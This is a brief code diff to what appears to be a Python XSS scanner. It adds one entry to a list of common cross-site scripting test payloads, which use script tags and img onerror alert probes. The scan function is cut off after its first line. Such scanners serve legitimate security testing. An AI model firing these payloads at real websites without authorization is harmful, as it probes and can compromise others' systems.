@@ -1,13 +1,16 @@
 import requests
 from urllib.parse import urlparse, parse_qs
 
+
 # Common XSS payloads
 XSS_PAYLOADS = [
     "<script>alert('XSS')</script>",
     '"><script>alert(1)</script>',
     "'><script>alert('XSS')</script>",
-    '"><img src=x onerror=alert(1)>'
+    '"><img src=x onerror=alert(1)>',
+    "'><img src=x onerror=alert('XSS')>"
 ]
+
 
 def scan(target):
     output = f"[*] Scanning {target} for XSS vulnerabilities...\n"
